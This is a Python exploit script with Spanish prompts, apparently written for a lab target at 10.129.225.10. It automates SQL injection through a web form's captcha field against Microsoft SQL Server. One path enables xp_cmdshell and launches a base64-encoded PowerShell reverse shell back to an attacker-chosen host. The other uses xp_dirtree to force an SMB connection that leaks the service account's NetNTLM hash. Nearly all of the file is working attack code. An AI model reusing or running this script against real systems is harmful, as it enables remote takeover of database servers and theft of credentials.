import base64
import requests
import re
import time

s = requests.Session()
entrada_1 = input("Si desea obtener una reverse shell en el sistema destino, digite 'R'.\n\rSi desea capturar el hash NetNTLM de la cuenta utilizada para ejecutar el RDBMS en el sistema Windows destino, digite 'C'.\n\rDigite su entrada: ")
entrada = input("Digite el email y password de un usuario valido (separados por el caracter ':'): ")
credenciales = entrada.split(':')
data = {"e":f"{credenciales[0]}","p":f"{credenciales[1]}"}
s.post('http://10.129.225.10/login.php',data=data)

if entrada_1 == 'R':
	respuesta = s.get('http://10.129.225.10/new.php')
	operandos = ((re.search(r"What is ([^?]+)",respuesta.text)).group(1)).split('+')
	captcha = int(operandos[0])+int(operandos[1])
	captcha_id = (re.search(r'<input type="hidden" name="captchaId" value="([^?]\d+)',respuesta.text)).group(1)
	data = {"title":"t","message":"t","picture":"","captchaAnswer":f"{captcha}' and (select IS_SRVROLEMEMBER('sysadmin'))=1--","captchaId":f"{captcha_id}"}
	respuesta = s.post('http://10.129.225.10/new.php',data=data)
	if respuesta.text == "Posting is disabled :) Imagine if this error message looked cooler though...":
		print("El usuario utilizado por la aplicacion web para conectarse al SQLServer tiene el rol 'sysadmin'. AHora, habilitaremos el procedicimiento almacenado extendido 'xp_cmdshell' con el fin de poder ejecutar comandos en el OS del sistema destino.")
		data = {"title":"t","message":"t","picture":"","captchaAnswer":f"{captcha}'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--","captchaId":f"{captcha_id}"}
		s.post('http://10.129.225.10/new.php',data=data)
		data = {"title":"t","message":"t","picture":"","captchaAnswer":f"{captcha}'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--","captchaId":f"{captcha_id}"}
		s.post('http://10.129.225.10/new.php',data=data)
		entrada = input("'xp_cmdshell' esta habilitado. Para obtener un reverse shell en el sistema destino, debe habilitar un puerto en escucha en su sistema con Netcat. Luego, debe proporcionar la direccion IP de su sistema y el numero de puerto en escucha separados por el caracter ':': ")
		ip_port = entrada.split(':')
		time.sleep(2)
		payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip_port[0]}",{ip_port[1]});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
		payload_encode = base64.b64encode(payload.encode('utf-16le')).decode()
		data = {"title":"t","message":"t","picture":"","captchaAnswer":f"{captcha}';exec xp_cmdshell 'powershell -exec bypass -enc {payload_encode}';--","captchaId":f"{captcha_id}"}
		s.post('http://10.129.225.10/new.php',data=data)
		print(f"El comando se ejecuto exitosamente, verifique si obtuvo su reverse shell.")

	else:
		print("No cuenta con el rol 'sysadmin' para habilitar 'xp_cmdshell'")

if entrada_1 =='C':
	print("Debe levantar un servidor SMB en su sistema.Para ello puede utilizar este comando 'python3 smbserver.py -smb2support server .'.")
	time.sleep(2)
	entrada = input('Digite la direccion IP de su sistema y el nombre del recurso compartido en su servidor SMB, separados por una coma: ')
	ip_resource = entrada.split(',')
	respuesta = s.get('http://10.129.225.10/new.php')
	operandos = ((re.search(r"What is ([^?]+)",respuesta.text)).group(1)).split('+')
	captcha = int(operandos[0])+int(operandos[1])
	captcha_id = (re.search(r'<input type="hidden" name="captchaId" value="([^?]\d+)',respuesta.text)).group(1)
	data = {"title":"t","message":"t","picture":"","captchaAnswer":f"{captcha}'; EXEC master.sys.xp_dirtree '\\\\{ip_resource[0]}\\\\{ip_resource[1]}', 1, 1;--","captchaId":f"{captcha_id}"}
	s.post('http://10.129.225.10/new.php',data=data)
	print("Observe en los registros de su servidor SMB, el hash capturado")
